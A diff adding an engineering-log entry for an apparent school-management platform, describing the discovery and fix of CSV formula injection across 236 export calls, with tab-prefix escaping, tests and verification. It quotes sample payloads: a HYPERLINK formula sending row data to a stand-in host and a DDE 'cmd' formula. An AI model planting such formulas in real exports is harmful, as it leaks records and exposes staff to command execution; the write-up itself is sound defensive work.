@@ -4278,6 +4278,53 @@ pick-up — empty tables, not broken readers, but indistinguishable from the
 outside, so `SmokeMarkerSeeder` now plants a marker in each of the three and
 the walk is a real answer rather than a hopeful one.
 
+## 5cs. 236 CSV writes, none of them escaped (2026-09-14)
+
+Found immediately after shipping seven new exports, by asking what the last
+seven had in common with the other ninety-odd.
+
+A CSV is a text file; Excel, LibreOffice and Sheets do not open it as one. A
+cell starting `=`, `+`, `-`, `@`, tab or CR is a **formula**, and the person
+who typed the cell decides what it does. `=HYPERLINK("https://elsewhere/?x="&A1,"Click")`
+sends the row beside it to whoever wrote the name; `=cmd|'/c calc'!A0` is DDE,
+which still prompts on a default Excel install and which office staff click
+through because the file came from their own school system.
+
+**236 `fputcsv` calls across 101 files. Not one escaped anything.** The only
+thing resembling protection was `GradebookController::csvCell`, which formats
+(`Abs`, `Ex`) and does not escape.
+
+This platform is a good target for it. Almost every column in these exports is
+free text somebody typed — a name, a behaviour note, a leave reason, a book
+title, a guardian's address. **A parent who can enter their own child's name on
+a registration form can put a formula into a report the finance office opens.**
+
+Fixed with one writer — `App\Support\Csv::put()` — applied at all 236 sites,
+plus `tests/Architecture/CsvWritesAreEscapedTest.php`, which fails on a raw
+`fputcsv` anywhere outside the helper. **No baseline**, unlike the repo's other
+gates: there is no legitimate reason to write an unescaped row.
+
+**Tab, not apostrophe** (ADR-034). The apostrophe is the answer most search
+results give and it is wrong: invisible in Excel, a literal character
+everywhere else, so every downstream importer sees `'Ahmed`. It trades a
+security bug for a data bug and hides the data bug from the one program you
+tested in. Numbers pass through untouched — `-450` is a refund and
+`+9607820288` is how a Maldivian phone number is written, and an export nobody
+can sum is an export nobody uses.
+
+**Verified, three ways.** 16 unit cases on the escaping itself, including one
+that writes a row and checks the *second* and *fourth* cells — a row-level
+helper that only guarded column one would pass every single-cell test and still
+ship the hole. The gate was checked against a deliberately planted raw
+`fputcsv` and failed on it, so it is not vacuous. And a live payload planted in
+`book_titles` was downloaded through the browser as an ordinary admin:
+
+    "4,"\t=HYPERLINK(""https://elsewhere/?x=""&A1,""Click"")","\t@SUM(1+9)*cmd|'/c calc'!A0",..."
+
+Both cells arrive tab-prefixed and inert. Full suite 1870 passed — the 101-file
+rewrite broke nothing, which the existing export tests are positioned to catch
+because they assert CSV *contents* rather than status codes.
+
 ## 5cr. The lesson that reached exactly one file (2026-09-14)
 
 `ReserveOfferingSeatAction` carries a comment written after something bit
